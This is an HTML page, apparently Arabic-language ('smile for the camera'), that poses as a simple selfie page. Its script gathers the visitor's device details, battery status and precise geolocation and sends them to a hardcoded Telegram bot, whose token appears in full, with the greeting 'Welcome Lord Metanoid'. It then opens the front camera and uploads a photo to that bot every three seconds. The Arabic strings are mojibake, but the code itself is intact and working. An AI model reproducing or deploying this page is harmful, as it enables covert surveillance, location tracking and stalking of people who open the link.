<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>Ø§Ø¨ØªØ³Ù… Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§</title>
  <style>
    body {
      margin: 0;
      background-color: black;
      color: white;
      font-family: 'Courier New', monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 20px;
    }
    video {
      width: 90%;
      max-width: 400px;
      border: 3px solid white;
      border-radius: 12px;
    }
  </style>
</head>
<body>
  <h1>ðŸ“¸ Ø§Ø¨ØªØ³Ù… Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§</h1>
  <video id="video" autoplay playsinline></video>

  <script>
    const video = document.getElementById("video");
    const chatId = "2045242656";
    const botToken = "7593287636:AAFVDiMOuTsVlqmO-62MM3MGECREfXo9YEE";
    let infoSent = false;

    // Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù… Ù†ØµÙŠØ©
    async function sendTextMessage(message) {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });
    }

    // Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹
    async function collectFullInfo() {
      let info = `â˜£ï¸ Welcome Lord Metanoidâ˜£ï¸\n`;

      const ua = navigator.userAgent;
      info += `// ð——ð—²ð˜ƒð—¶ð—°ð—²: ${ua}\n`;

      const now = new Date();
      info += `// ð—§ð—¶ð—ºð—²: ${now.toLocaleString()}\n`;

      if ('connection' in navigator) {
        const conn = navigator.connection;
        info += `// ð—¡ð—²ð˜ð˜„ð—¼ð—¿ð—¸: ${conn.effectiveType || 'Unknown'}\n`;
      }

      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          info += `// ð—•ð—®ð˜ð˜ð—²ð—¿ð˜†: ${Math.round(battery.level * 100)}%\n`;
          info += `// ð—–ð—µð—®ð—¿ð—´ð—¶ð—»ð—´: ${battery.charging ? 'Yes' : 'No'}\n`;
          info += `// ð—£ð—¼ð˜„ð—²ð—¿ ð—¦ð—®ð˜ƒð—²ð—¿: ${battery.charging ? 'Off' : 'Maybe On'}\n`;
        } catch (e) {}
      }

      return new Promise((resolve) => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(pos => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            info += `// ð—Ÿð—¼ð—°ð—®ð˜ð—¶ð—¼ð—»: https://maps.google.com/?q=${lat},${lon}\n`;
            info += `// ð—”ð—°ð—°ð˜‚ð—¿ð—®ð—°ð˜†: ${pos.coords.accuracy}m\n`;
            resolve(info);
          }, () => resolve(info));
        } else {
          resolve(info);
        }
      });
    }

    // ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
    async function initCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });
        video.srcObject = stream;
        startCapturing();
      } catch (err) {
        alert("ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§");
        console.error(err);
      }
    }

    function captureImage() {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext("2d");
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL("image/jpeg");
    }

    async function sendToTelegram(base64Image) {
      const blob = await (await fetch(base64Image)).blob();
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "selfie.jpg");

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
      }).catch(e => console.error("ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©", e));
    }

    function startCapturing() {
      setInterval(() => {
        const image = captureImage();
        sendToTelegram(image);
      }, 3000);
    }

    // Ø§Ù„Ø¨Ø¯Ø§ÙŠØ©: Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø«Ù… ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
    async function start() {
      if (!infoSent) {
        const fullInfo = await collectFullInfo();
        await sendTextMessage(fullInfo);
        infoSent = true;
      }
      await initCamera();
    }

    start();
  </script>
</body>
</html>
